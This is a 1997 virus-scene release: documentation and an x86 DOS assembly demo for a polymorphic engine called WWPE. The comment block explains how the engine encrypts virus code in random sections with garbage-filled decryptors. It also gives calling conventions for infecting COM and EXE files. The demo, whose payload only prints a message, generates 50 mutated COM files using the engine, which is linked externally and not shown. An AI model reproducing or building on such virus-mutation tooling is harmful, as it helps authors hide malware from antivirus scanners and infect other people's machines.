comment $
                   Wild W0rker's Polymorphic Engine v0.1

                           by Wild W0rker /RSA

How it works
============

Virus code divded in to random number of section (min=1, max=10). Each section
encrypted with own encryptor and have own decryptor. When all sections
decryptros generated, they all encrypted again...Of course all decryptors can
have garbage if you set flag when calling (look how to use section). Garbage
generator can make almost all instructions:) It can make call/jmp/jxx
reg manip/port reading/single ops/interrupt calling. Decryptors with garbage
can be large and sometimes can be 6kb:) All decryptors placed at the end 
of virus. That's look like:

                            ---------------
                            |     HOST    |
                            |-------------|
                            |   JMP/CALL  |--
                            |-------------| |
                          ->|Encrypted    | |
                          | |        virus| |
                          | |-------------| |
                          --| Decryptors  |<-
                            ---------------

How to use
==========

Before calling WWPE you must setup all input registers:

Input:
        DS:SI - Code to crypt.
        BP    - Offset where the decryption routine will be executed.
                (If COM, BP=100h)
        CX    - Length of code for crypt
        ES:DI - Where to put encrypted code + decryptors.
        AL    - Bit field

            bit 0: 0 - Going to decryptors with JMP, 1 - Going to decryptors
                   with CALL (coz decryptors at the end of virus and they must
                   take control)

            bit 1: 0 - Use CS when decrypting insted DS. That's you need to use
                   when infecting EXE file, coz in EXE file CS!=DS.

            bit 2: 0 - No garbage in decryptors (huh:), 1 - Generate garbage
                   in decryptors.

Public:
        WWPE     - Polymorphic engine.
        WWPE_END - End of WWPE (Offset)
        RND      - Random generator (Inp: AX - limit; Out: AX - rnd value)

Output:
        CX       - Length of encrypted code + decryptors.

Wild W0rker /RSA. 
$

.model  tiny
.code
org     100h
start:
                lea     dx,mes1
                call    print
                xor     ax,ax
                int     16h
                cmp     ah,1
                jne     generate
                jmp     exitdemo
generate:
                lea     dx,mes3
                call    print
                mov     cx,50
makedemos:
                push    cx
                mov     cx,offset progiiend - offset progii
                lea     si,progii
                lea     di,wwpe_end
                mov     bp,100h
                mov     ax,255
                call    rnd
                xchg    ah,al
                mov     al,0
                cmp     ah,127
                jb      call_poly
                inc     al
call_poly:
                or      al,4
                call    wwpe
                push    cx
                mov     ah,3ch
                lea     dx,fname
                xor     cx,cx
                int     21h
                pop     cx dx
                jc      exitdemo
                push    dx
                xchg    ax,bx
                mov     ah,40h
                lea     dx,wwpe_end
                int     21h
                mov     ah,3eh
                int     21h
                lea     bx,fname+1
                mov     cx,2
numcalc:
                inc     byte ptr ds:[bx]
                cmp     byte ptr ds:[bx],3ah
                jne     nameok
                sub     byte ptr ds:[bx],0ah
                dec     bx
                loop    numcalc
nameok:
                pop     cx
                loop    makedemos

exitdemo:
                lea     dx,mes2
                call    print
                int     20h

print:
                push    ds
                mov     ah,9
                push    cs
                pop     ds
                int     21h
                pop     ds
                ret

mes1            db      13,10,'      This program make 50 programs which encrypted by WWPE v0.1       ',13,10
                db      'WWPE - Wild W0rker''s Polymorphic Engine. (c) 1997 by Wild W0rker /RSA.',13,10
                db      13,10,'Press any key for start or ESC for exit.',13,10,'$'
mes3            db      13,10,'Please wait...',13,10,'$'
mes2            db      13,10,'CU l8r :)',13,10,'$'
fname           db      '00.com',0

progii:
                call    $+3
                pop     di
                sub     di,offset progii+3
                mov     ah,9
                lea     dx,mes
                add     dx,di
                int     21h
                int     20h

mes             db      13,10,'This is test for Wild W0rker''s Polymorphic Engine.',13,10,24h
progiiend:

extrn           wwpe:near
extrn           wwpe_end:near
extrn           rnd:near
                end     start
